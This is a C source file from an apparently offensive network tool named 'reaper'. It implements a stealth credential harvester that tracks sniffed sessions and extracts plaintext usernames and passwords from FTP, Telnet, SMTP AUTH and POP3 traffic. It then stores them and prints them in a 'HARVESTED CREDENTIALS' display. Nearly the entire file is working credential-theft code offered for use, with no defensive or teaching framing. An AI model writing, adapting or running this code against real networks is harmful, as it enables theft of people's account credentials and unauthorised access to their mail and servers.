/*
 * ═══════════════════════════════════════════════════════════════════════════
 *  REAPER_HARVEST.C - MULTI-PROTOCOL CREDENTIAL HARVESTER
 *  Extract credentials from various protocols
 *  
 *  Supported Protocols:
 *  - FTP (USER/PASS)
 *  - Telnet (login sequences)
 *  - SMTP (AUTH LOGIN, AUTH PLAIN)
 *  - POP3 (USER/PASS)
 *  - IMAP (LOGIN)
 *  
 *  Zero Dependencies | Full Stealth | Military Grade
 * ═══════════════════════════════════════════════════════════════════════════
 */

#include "reaper_core.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <time.h>

/* ═══════════════════════════════════════════════════════════════════════════
 *  SESSION TRACKING FOR STATEFUL PROTOCOLS
 * ═══════════════════════════════════════════════════════════════════════════ */

#define MAX_TRACKED_SESSIONS 256

typedef enum {
    STATE_INIT,
    STATE_USER_SENT,
    STATE_PASS_PENDING,
    STATE_AUTH_STARTED,
    STATE_COMPLETE
} harvest_state_t;

typedef struct {
    struct in_addr src_ip;
    struct in_addr dst_ip;
    uint16_t src_port;
    uint16_t dst_port;
    protocol_t protocol;
    harvest_state_t state;
    char username[256];
    char partial_data[512];
    time_t last_activity;
} tracked_session_t;

static tracked_session_t g_sessions[MAX_TRACKED_SESSIONS];
static int g_session_count = 0;
static pthread_mutex_t g_session_lock = PTHREAD_MUTEX_INITIALIZER;

static tracked_session_t* find_or_create_session(struct in_addr src, struct in_addr dst,
                                                   uint16_t sport, uint16_t dport,
                                                   protocol_t proto) {
    pthread_mutex_lock(&g_session_lock);
    
    // Find existing
    for (int i = 0; i < g_session_count; i++) {
        if (g_sessions[i].src_ip.s_addr == src.s_addr &&
            g_sessions[i].dst_ip.s_addr == dst.s_addr &&
            g_sessions[i].src_port == sport &&
            g_sessions[i].dst_port == dport &&
            g_sessions[i].protocol == proto) {
            g_sessions[i].last_activity = time(NULL);
            pthread_mutex_unlock(&g_session_lock);
            return &g_sessions[i];
        }
    }
    
    // Create new
    if (g_session_count < MAX_TRACKED_SESSIONS) {
        tracked_session_t* s = &g_sessions[g_session_count++];
        memset(s, 0, sizeof(*s));
        s->src_ip = src;
        s->dst_ip = dst;
        s->src_port = sport;
        s->dst_port = dport;
        s->protocol = proto;
        s->state = STATE_INIT;
        s->last_activity = time(NULL);
        pthread_mutex_unlock(&g_session_lock);
        return s;
    }
    
    pthread_mutex_unlock(&g_session_lock);
    return NULL;
}

static void remove_session(tracked_session_t* session) {
    pthread_mutex_lock(&g_session_lock);
    
    int idx = session - g_sessions;
    if (idx >= 0 && idx < g_session_count) {
        if (idx < g_session_count - 1) {
            memmove(&g_sessions[idx], &g_sessions[idx + 1],
                    (g_session_count - idx - 1) * sizeof(tracked_session_t));
        }
        g_session_count--;
    }
    
    pthread_mutex_unlock(&g_session_lock);
}

/* ═══════════════════════════════════════════════════════════════════════════
 *  BASE64 DECODE (for SMTP AUTH)
 * ═══════════════════════════════════════════════════════════════════════════ */

static int base64_decode_harvest(const char* src, char* dst, int max_len) {
    static const char b64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    
    int i = 0, j = 0;
    uint32_t buf = 0;
    int bits = 0;
    
    while (src[i] && j < max_len - 1) {
        char c = src[i++];
        if (c == '=' || c == '\r' || c == '\n') break;
        
        const char* p = strchr(b64, c);
        if (!p) continue;
        
        buf = (buf << 6) | (p - b64);
        bits += 6;
        
        while (bits >= 8 && j < max_len - 1) {
            bits -= 8;
            dst[j++] = (buf >> bits) & 0xFF;
        }
    }
    
    dst[j] = '\0';
    return j;
}

/* ═══════════════════════════════════════════════════════════════════════════
 *  FTP CREDENTIAL EXTRACTION
 * ═══════════════════════════════════════════════════════════════════════════ */

int reaper_harvest_ftp(reaper_session_t* session, captured_packet_t* pkt) {
    const char* data = (const char*)pkt->data;
    int data_len = strlen(data);
    
    if (data_len < 5) return 0;
    
    tracked_session_t* sess = find_or_create_session(
        pkt->src_ip, pkt->dst_ip, pkt->src_port, pkt->dst_port, PROTO_FTP);
    
    if (!sess) return 0;
    
    // Check for USER command
    if (strncasecmp(data, "USER ", 5) == 0) {
        const char* user = data + 5;
        int i = 0;
        while (user[i] && user[i] != '\r' && user[i] != '\n' && i < 255) {
            sess->username[i] = user[i];
            i++;
        }
        sess->username[i] = '\0';
        sess->state = STATE_USER_SENT;
        return 0;
    }
    
    // Check for PASS command
    if (strncasecmp(data, "PASS ", 5) == 0 && sess->state == STATE_USER_SENT) {
        const char* pass = data + 5;
        char password[256];
        int i = 0;
        while (pass[i] && pass[i] != '\r' && pass[i] != '\n' && i < 255) {
            password[i] = pass[i];
            i++;
        }
        password[i] = '\0';
        
        // Store credential
        harvested_cred_t cred;
        memset(&cred, 0, sizeof(cred));
        cred.timestamp = time(NULL);
        cred.protocol = PROTO_FTP;
        cred.src_ip = pkt->src_ip;
        cred.dst_ip = pkt->dst_ip;
        cred.dst_port = pkt->dst_port;
        snprintf(cred.host, sizeof(cred.host), "%s", inet_ntoa(pkt->dst_ip));
        strncpy(cred.username, sess->username, sizeof(cred.username) - 1);
        strncpy(cred.password, password, sizeof(cred.password) - 1);
        strncpy(cred.raw_data, "FTP Login", sizeof(cred.raw_data) - 1);
        
        cred_store_add(&session->cred_store, &cred);
        session->creds_harvested++;
        
        remove_session(sess);
        return 1;
    }
    
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════════
 *  TELNET CREDENTIAL EXTRACTION
 * ═══════════════════════════════════════════════════════════════════════════ */

int reaper_harvest_telnet(reaper_session_t* session, captured_packet_t* pkt) {
    const char* data = (const char*)pkt->data;
    int data_len = strlen(data);
    
    if (data_len < 1) return 0;
    
    tracked_session_t* sess = find_or_create_session(
        pkt->src_ip, pkt->dst_ip, pkt->src_port, pkt->dst_port, PROTO_TELNET);
    
    if (!sess) return 0;
    
    // Telnet is tricky - often sends one char at a time
    // Look for login: prompt from server (dst->src)
    
    // Check if this is from server
    if (pkt->src_port == 23) {
        // Server response - check for prompts
        if (strcasestr(data, "login:") || strcasestr(data, "username:")) {
            sess->state = STATE_USER_SENT;
            sess->partial_data[0] = '\0';
        }
        else if (strcasestr(data, "password:") && sess->state == STATE_USER_SENT) {
            // Username was accumulated, now waiting for password
            strncpy(sess->username, sess->partial_data, sizeof(sess->username) - 1);
            sess->partial_data[0] = '\0';
            sess->state = STATE_PASS_PENDING;
        }
        else if ((strcasestr(data, "last login") || strcasestr(data, "welcome") ||
                  strcasestr(data, "$") || strcasestr(data, "#")) && 
                 sess->state == STATE_PASS_PENDING) {
            // Login successful, password was in partial_data
            harvested_cred_t cred;
            memset(&cred, 0, sizeof(cred));
            cred.timestamp = time(NULL);
            cred.protocol = PROTO_TELNET;
            cred.src_ip = pkt->dst_ip;  // Client
            cred.dst_ip = pkt->src_ip;  // Server
            cred.dst_port = 23;
            snprintf(cred.host, sizeof(cred.host), "%s", inet_ntoa(pkt->src_ip));
            strncpy(cred.username, sess->username, sizeof(cred.username) - 1);
            strncpy(cred.password, sess->partial_data, sizeof(cred.password) - 1);
            strncpy(cred.raw_data, "Telnet Login", sizeof(cred.raw_data) - 1);
            
            cred_store_add(&session->cred_store, &cred);
            session->creds_harvested++;
            
            remove_session(sess);
            return 1;
        }
    }
    else if (pkt->dst_port == 23) {
        // Client data - accumulate
        if (sess->state == STATE_USER_SENT || sess->state == STATE_PASS_PENDING) {
            int cur_len = strlen(sess->partial_data);
            int add_len = data_len;
            
            // Skip telnet control chars
            for (int i = 0; i < data_len && cur_len < 510; i++) {
                char c = data[i];
                if (c >= 32 && c < 127) {
                    sess->partial_data[cur_len++] = c;
                }
                else if (c == '\r' || c == '\n') {
                    // End of input
                    sess->partial_data[cur_len] = '\0';
                }
            }
            sess->partial_data[cur_len] = '\0';
        }
    }
    
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════════
 *  SMTP AUTH EXTRACTION
 * ═══════════════════════════════════════════════════════════════════════════ */

int reaper_harvest_smtp(reaper_session_t* session, captured_packet_t* pkt) {
    const char* data = (const char*)pkt->data;
    int data_len = strlen(data);
    
    if (data_len < 5) return 0;
    
    tracked_session_t* sess = find_or_create_session(
        pkt->src_ip, pkt->dst_ip, pkt->src_port, pkt->dst_port, PROTO_SMTP);
    
    if (!sess) return 0;
    
    // AUTH LOGIN
    if (strncasecmp(data, "AUTH LOGIN", 10) == 0) {
        sess->state = STATE_AUTH_STARTED;
        sess->partial_data[0] = '\0';
        return 0;
    }
    
    // AUTH PLAIN (base64 encoded: \0username\0password)
    if (strncasecmp(data, "AUTH PLAIN ", 11) == 0) {
        char decoded[256];
        base64_decode_harvest(data + 11, decoded, sizeof(decoded));
        
        // Find username and password (separated by NULs)
        char* user = decoded + 1;  // Skip first NUL
        char* pass = user + strlen(user) + 1;
        
        if (strlen(user) > 0 && strlen(pass) > 0) {
            harvested_cred_t cred;
            memset(&cred, 0, sizeof(cred));
            cred.timestamp = time(NULL);
            cred.protocol = PROTO_SMTP;
            cred.src_ip = pkt->src_ip;
            cred.dst_ip = pkt->dst_ip;
            cred.dst_port = pkt->dst_port;
            snprintf(cred.host, sizeof(cred.host), "%s", inet_ntoa(pkt->dst_ip));
            strncpy(cred.username, user, sizeof(cred.username) - 1);
            strncpy(cred.password, pass, sizeof(cred.password) - 1);
            strncpy(cred.raw_data, "SMTP AUTH PLAIN", sizeof(cred.raw_data) - 1);
            
            cred_store_add(&session->cred_store, &cred);
            session->creds_harvested++;
            return 1;
        }
    }
    
    // Handle AUTH LOGIN multi-step
    if (sess->state == STATE_AUTH_STARTED && pkt->dst_port == 25) {
        // This is base64 username or password
        if (sess->username[0] == '\0') {
            base64_decode_harvest(data, sess->username, sizeof(sess->username));
        } else {
            char password[256];
            base64_decode_harvest(data, password, sizeof(password));
            
            harvested_cred_t cred;
            memset(&cred, 0, sizeof(cred));
            cred.timestamp = time(NULL);
            cred.protocol = PROTO_SMTP;
            cred.src_ip = pkt->src_ip;
            cred.dst_ip = pkt->dst_ip;
            cred.dst_port = pkt->dst_port;
            snprintf(cred.host, sizeof(cred.host), "%s", inet_ntoa(pkt->dst_ip));
            strncpy(cred.username, sess->username, sizeof(cred.username) - 1);
            strncpy(cred.password, password, sizeof(cred.password) - 1);
            strncpy(cred.raw_data, "SMTP AUTH LOGIN", sizeof(cred.raw_data) - 1);
            
            cred_store_add(&session->cred_store, &cred);
            session->creds_harvested++;
            
            remove_session(sess);
            return 1;
        }
    }
    
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════════
 *  POP3 CREDENTIAL EXTRACTION
 * ═══════════════════════════════════════════════════════════════════════════ */

int reaper_harvest_pop3(reaper_session_t* session, captured_packet_t* pkt) {
    const char* data = (const char*)pkt->data;
    int data_len = strlen(data);
    
    if (data_len < 5) return 0;
    
    tracked_session_t* sess = find_or_create_session(
        pkt->src_ip, pkt->dst_ip, pkt->src_port, pkt->dst_port, PROTO_POP3);
    
    if (!sess) return 0;
    
    // USER command
    if (strncasecmp(data, "USER ", 5) == 0) {
        const char* user = data + 5;
        int i = 0;
        while (user[i] && user[i] != '\r' && user[i] != '\n' && i < 255) {
            sess->username[i] = user[i];
            i++;
        }
        sess->username[i] = '\0';
        sess->state = STATE_USER_SENT;
        return 0;
    }
    
    // PASS command
    if (strncasecmp(data, "PASS ", 5) == 0 && sess->state == STATE_USER_SENT) {
        const char* pass = data + 5;
        char password[256];
        int i = 0;
        while (pass[i] && pass[i] != '\r' && pass[i] != '\n' && i < 255) {
            password[i] = pass[i];
            i++;
        }
        password[i] = '\0';
        
        harvested_cred_t cred;
        memset(&cred, 0, sizeof(cred));
        cred.timestamp = time(NULL);
        cred.protocol = PROTO_POP3;
        cred.src_ip = pkt->src_ip;
        cred.dst_ip = pkt->dst_ip;
        cred.dst_port = pkt->dst_port;
        snprintf(cred.host, sizeof(cred.host), "%s", inet_ntoa(pkt->dst_ip));
        strncpy(cred.username, sess->username, sizeof(cred.username) - 1);
        strncpy(cred.password, password, sizeof(cred.password) - 1);
        strncpy(cred.raw_data, "POP3 Login", sizeof(cred.raw_data) - 1);
        
        cred_store_add(&session->cred_store, &cred);
        session->creds_harvested++;
        
        remove_session(sess);
        return 1;
    }
    
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════════
 *  MAIN HARVEST PROCESSOR
 * ═══════════════════════════════════════════════════════════════════════════ */

int reaper_process_harvest(reaper_session_t* session, captured_packet_t* pkt) {
    switch (pkt->protocol) {
        case PROTO_FTP:
            return reaper_harvest_ftp(session, pkt);
        case PROTO_TELNET:
            return reaper_harvest_telnet(session, pkt);
        case PROTO_SMTP:
            return reaper_harvest_smtp(session, pkt);
        case PROTO_POP3:
            return reaper_harvest_pop3(session, pkt);
        default:
            return 0;
    }
}

/* ═══════════════════════════════════════════════════════════════════════════
 *  HARVEST THREAD
 * ═══════════════════════════════════════════════════════════════════════════ */

void* reaper_harvest_thread(void* arg) {
    reaper_session_t* session = (reaper_session_t*)arg;
    captured_packet_t pkt;
    
    while (session->running) {
        if (ring_buffer_pop(&session->packet_buffer, &pkt) < 0) {
            usleep(10000);
            continue;
        }
        
        if (session->mode & REAPER_MODE_HARVEST) {
            reaper_process_harvest(session, &pkt);
        }
    }
    
    return NULL;
}

/* ═══════════════════════════════════════════════════════════════════════════
 *  PRINT HARVESTED CREDENTIALS
 * ═══════════════════════════════════════════════════════════════════════════ */

void reaper_print_credentials(reaper_session_t* session) {
    pthread_mutex_lock(&session->cred_store.lock);
    
    printf("\n");
    printf("\033[31m╔════════════════════════════════════════════════════════════╗\033[0m\n");
    printf("\033[31m║           HARVESTED CREDENTIALS                            ║\033[0m\n");
    printf("\033[31m╚════════════════════════════════════════════════════════════╝\033[0m\n\n");
    
    if (session->cred_store.count == 0) {
        printf("  (no credentials captured yet)\n");
    }
    
    for (int i = 0; i < session->cred_store.count; i++) {
        harvested_cred_t* c = &session->cred_store.creds[i];
        
        char time_str[32];
        strftime(time_str, sizeof(time_str), "%H:%M:%S", localtime((time_t*)&c->timestamp));
        
        printf("\033[33m[%s]\033[0m %s | \033[36m%s:%d\033[0m\n",
               time_str,
               protocol_to_string(c->protocol),
               c->host,
               c->dst_port);
        printf("        User: \033[32m%s\033[0m\n", c->username);
        printf("        Pass: \033[31m%s\033[0m\n", c->password);
        printf("\n");
    }
    
    printf("─────────────────────────────────────────────────────────────────\n");
    printf("Total: %d credentials harvested\n\n", session->cred_store.count);
    
    pthread_mutex_unlock(&session->cred_store.lock);
}
